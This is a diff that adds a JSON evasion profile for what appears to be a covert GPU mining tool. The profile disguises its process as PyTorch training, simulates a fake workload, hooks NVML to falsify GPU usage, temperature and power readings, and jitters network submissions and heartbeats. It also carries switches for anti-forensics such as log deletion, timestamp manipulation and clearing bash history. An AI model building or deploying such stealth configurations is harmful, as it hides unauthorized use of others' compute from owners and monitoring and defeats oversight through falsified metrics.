@@ -1,0 +1,79 @@
+{
+  "profile_name": "balanced",
+  "description": "Balanced configuration - moderate stealth with reasonable performance",
+  "risk_level": "moderate_detection_evasion",
+
+  "process_masquerading": {
+    "enabled": true,
+    "process_name": "python3",
+    "cmdline_args": ["-m", "torch.distributed.launch", "--nproc_per_node=1", "train.py"],
+    "parent_process_spoofing": false,
+    "target_parent": null
+  },
+
+  "workload_simulation": {
+    "enabled": true,
+    "pattern": "scientific_computing",
+    "fake_framework": "pytorch",
+    "memory_access_pattern": "bursty_with_long_pauses",
+    "cpu_usage_simulation": {
+      "enabled": true,
+      "target_usage_percent": 25,
+      "fluctuation_range": 10
+    }
+  },
+
+  "metrics_obfuscation": {
+    "enabled": true,
+    "nvml_hooking": true,
+    "reported_utilization": {
+      "gpu_compute": 60,
+      "memory_usage": 75,
+      "temperature": 72,
+      "power_draw_watts": 220
+    },
+    "add_random_variance": true,
+    "variance_percent": 5
+  },
+
+  "network_evasion": {
+    "enabled": true,
+    "use_tls": true,
+    "tls_version": "1.2",
+    "randomize_timing": true,
+    "jitter_ms": {
+      "min": 50,
+      "max": 200
+    },
+    "connection_frequency": {
+      "submit_interval_seconds": 15,
+      "heartbeat_interval_seconds": 60
+    },
+    "dns_over_https": false
+  },
+
+  "anti_forensics": {
+    "enabled": false,
+    "memory_scrubbing": false,
+    "log_deletion": false,
+    "timestamp_manipulation": false,
+    "clear_bash_history": false
+  },
+
+  "resource_limiting": {
+    "enabled": true,
+    "max_gpu_utilization_percent": 85,
+    "max_memory_usage_mb": 8192,
+    "max_power_watts": 250,
+    "thermal_throttle_celsius": 80,
+    "adaptive_throttling": true
+  },
+
+  "operational_schedule": {
+    "enabled": false,
+    "time_based_operation": false,
+    "active_hours": null,
+    "pause_on_user_activity": false,
+    "resume_delay_seconds": 0
+  }
+}
